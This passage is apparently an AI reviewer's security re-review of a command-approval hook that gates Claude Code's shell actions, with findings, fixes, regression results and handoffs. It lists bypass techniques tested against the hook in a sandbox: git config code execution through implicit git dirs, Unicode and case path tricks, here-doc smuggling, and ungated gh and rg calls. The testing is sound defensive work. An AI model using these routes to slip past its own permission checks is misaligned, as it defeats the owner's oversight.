- Fix: compare base names case-insensitively (`head`, `packed-refs`, `config`, and the `objects`/`refs`/`hooks`/`info` segments). Make `config` ask whenever its parent directory holds `objects` or `refs`, or simply whenever the base name is `config` outside known source folders.

**C2-2. Minor, unverified suspicion (medium-low confidence): `gh pr …` is not gated by `gitDirOk`**
- Repro: with the implicit git dir from C2-1 in place, `cd sub/g && gh pr create --title t --body b` gives ALLOW (`L-GH`), and so does `cd sub/g && gh pr view 5`.
- Why it might matter: gh runs git itself. If any git subcommand it runs there executes config (for example `git status --porcelain` triggering `core.fsmonitor`, or `core.sshCommand` on a push), that is code execution.
- What I could check: offline with network denied, gh made **no** git call before its first API request (the `GIT_TRACE` file stayed empty). I could not observe what it runs after a successful API call without network access.
- Fix: one line. Apply the same `nestedGit`/`gitDirOk` cwd check in `ghAllow`, and optionally to `npm test`/`node --test`.

**C2-3. Note: `rg --no-ignore` is allowed only with explicit paths below the root**
- `rg --no-ignore KEY .`, no path, `--files`, `sub/..` and `cd sub && … ..` all give ask.
- `rg --no-ignore KEY sub` still searches `sub/` recursively. That includes gitignored, non-hidden files in it; hidden files such as `.env` and `.claude` stay skipped.
- A name scan of the repo found no non-hidden secret-like files (`secrets/`, `*.pem`, `*.key`, `credentials*`, `id_*`, `*.p12`). `cat` of such files would already be asked, but a recursive `rg` would not be. Acceptable for now; revisit if such files ever appear.

### C2.4 Final regression pass (round-1 and cycle-1 repros on the r3 install)

Every round-1 repro gives the same result as in the cycle-1 table (R.2):
- ask: `git diff` outside the repo, unquoted here-doc literals, `.ignore`/`rg`, Unicode paths, `EOF)` smuggling, `.npmrc`/`.mcp.json`/`CLAUDE.local.md`, `grep -r`, pathspec globs, `~user`.
- deny: the `.env` literal, `ſecrets`, `Application ſupport`, `.git` writes, `chflags` through `cd`/`xargs`, `--config-env`, `arch`/`noglob curl`.
- The ordinary quoted commit message and plain git reads are still allowed.

No regression found.

### C2.5 Verdict (fix cycle 2, the last one the charter allows)

`VERDICT: READY WITH CONDITIONS`

What remains, and when it matters:

| Item | Severity | Matters for merge / `shadow` / `enforce-deny`? | Matters for `enforce` (silent allows)? |
|---|---|---|---|
| C2-1: case-insensitive git-dir file rule | Minor | No. These are allow-side gaps, and those modes print no allow. | Yes, as the enabler for C2-2. Git itself is safe because of the gate. |
| C2-2: `gh` not gated by `gitDirOk` | Minor (unverified) | No | Yes. **Fix it (one line) or accept the risk explicitly before switching to `enforce`.** |
| C2-3: recursive `rg` in subdirectories | Note | No | Low. Revisit if secret-named files appear. |
| Documented residuals: agent-edited tests run under `npm test`/`node --test`; editable drill scripts; pty and mode file (round-1 note 13); owner zsh aliases (note 15) | Accepted by design (README "What this does not protect") | No | They are inherent to allow-mode. The owner decides at the enforce exit criteria. |

- **Nothing remaining blocks the merge, shadow mode or `enforce-deny`.** No deny is weakened; every Appendix A deny repro still denies.
- **Conditions before `enforce`:** fix C2-2 (gate `gh` like git) and C2-1 (case-insensitive base names), or have the owner accept them in writing.
- Both are allow-side issues, so they only matter once `enforce` is on. Since this was the last fix cycle, the Coordinator should put this choice to the owner rather than start a fourth Dev/Sec cycle.

### Handoff (fix cycle 2)

- Done: re-tested R1–R3 on a fresh enforce install with the real git gate; attacked the brace shadow copy, the `rev-parse` gate (env, hostile config, symlinks, worktrees, timeout), the implicit git-dir file rule, the recursive `rg` change and `gh`; ran a full regression pass; ran the tests offline (162/162).
- Files touched: `docs/reviews/M7/security.md` (this section, not committed). Scratch is under `scratchpad/m7-sec/r3`, `lc1`, `ghcfg`, `ghhome` and `harness/`.
- Open question: which git subcommands does `gh pr create`/`view` run after its API call? This needs network access, so verifying it is the owner's call. The fix is cheap either way.
- Next role: Coordinator, with a readiness report to the owner. Present C2-1 and C2-2 as conditions for `enforce` (fix outside the review loop, or accept).

---

## Re-review (fix cycle 3, final)

Date: 2026-11-04. Reviewer: Sec.

### C3.1 Scope and tools

- Code HEAD: `c29d629fd3342451fce33c876ac9ef4ae301bba0`.
- Commits reviewed: `13fdf59` (C2-1), `2ebd404` (C2-2), `c29d629` (README only). I read every source change (`git diff c483f3f c29d629 -- tools/approver/src`).
- Install: a fresh `enforce` temp install (`scratchpad/m7-sec/r4`) using the real `runGit` gate. No real HOME, Keychain, network, model or settings were used.
- Tests: `sandbox-exec` with outbound network denied gives **164 pass, 0 fail**.

### C3.2 C2-1 and C2-2 re-tested, with variants

**C2-1, git-dir file rule: fixed.**
- Writes of `sub/g2/head`, `HEAD`, `Head`, `heaD`, `packed-REFS`, `sub/g/HOOKS/x` and `hooks/pre-commit` all give ask (`K-PATH`).
- Write order no longer matters. In a directory that already holds one marker, the second marker asks whatever its case:
  - `o1/` holding `objects/`: `o1/config`, `o1/Config` and `o1/refs/k` all ask.
  - `o2/` holding `REFS/`: `o2/config` and `o2/objects/k` both ask.
- A single marker in an otherwise plain directory stays an ordinary edit: `new1/config`, `new2/objects/k`, `lib/config` and `docs/refs/a.md` are allowed. Git cannot accept a directory without `HEAD`, and writing `HEAD` in any case always asks.
- Unicode variants (`hеad` with a Cyrillic e, `conﬁg`, `refſ/k`) give ask (`K-UNICODE`).
- Side effect: `lib/hooks/useX.js` now asks when `lib/` also holds `config`. That is a false positive (usability only), which is acceptable.

**C2-2, gh gate: fixed.**
- With an implicit git dir at `sub/g`, `cd sub/g && gh pr create|view|checks|diff|comment` all give ask.
- `cd sub/g; gh pr view 5` and `cd sub/g || gh pr view 5` give ask: the cwd set is widened, so every possible cwd must pass the gate.
- `gh -R other/repo …`, `gh pr view 5 -R …`, `--repo …` and `gh -C sub/g …` give ask (flags not in the spec).
- These stay allowed: `gh pr view 5` and `gh pr create …` at the root, `cd sub && gh pr view 5`, and `cd sub/g && cd .. && gh pr view 5` (the final cwd is a normal directory).

### C3.3 Regression pass

I re-ran every repro from round 1, cycle 1 and cycle 2 on r4: 67 requests, giving 46 ask, 12 deny and 9 allow. All 9 allows are expected:
- the quoted `"$(cat <<'EOF'…)"` commit message;
- `git status`, `cd sub && git status` and `cd sub && git diff` in the main repo;
- `rg --no-ignore KEY sub` and `sub/../sub` (C2-3, documented in the README);
- the first single-marker writes into an empty `sub/g2` (see above).

Every deny from earlier rounds still denies. No regression found.

### C3.4 Final verdict

`VERDICT: READY`

Findings still open (none blocking):
1. Note: `rg --no-ignore <subfolder>` searches gitignored, non-hidden files in that folder. There are none in the repo today, and the README documents it (C2-3).
2. Note: a false positive in the git-dir file rule (`lib/hooks/…` next to `lib/config`). Usability only.
3. Note, accepted residuals documented in the README's "What this does not protect" section:
   - agent-edited tests or sources run under `npm test`/`node --test`;
   - drill scripts are editable;
   - the `mode` file is writable by any code-exec path, and the TTY check can be met with a pty;
   - owner zsh aliases and functions can change the meaning of an allowed word;
   - Claude Code transcript format dependence.
   These are inherent to allow-mode. The owner weighs them at the shadow → `enforce-deny` → `enforce` exit criteria.

Rationale:
- Every Blocker and Major from round 1, cycle 1 and cycle 2 is fixed and re-verified on a fresh enforce install, with the real git gate.
- No Appendix A deny is weakened, and the chflags/xattr requirement holds.
- The hook still fails closed on every error, timeout and oversized input.
- Nothing remaining blocks the merge, shadow mode, `enforce-deny` or `enforce`. Switching modes stays the owner's manual decision.

### Handoff (fix cycle 3, final)

- Done: re-tested C2-1 and C2-2 with case, Unicode, write-order and gh flag/cwd variants on a fresh enforce install; ran a full regression over all earlier repros; ran the tests offline (164/164).
- Files touched: `docs/reviews/M7/security.md` (this section, not committed). Scratch is under `scratchpad/m7-sec/r4` and `harness/`.
- Open questions: none.
- Next role: Coordinator, with the readiness report to the owner (merge approval; mode switches are the owner's call).
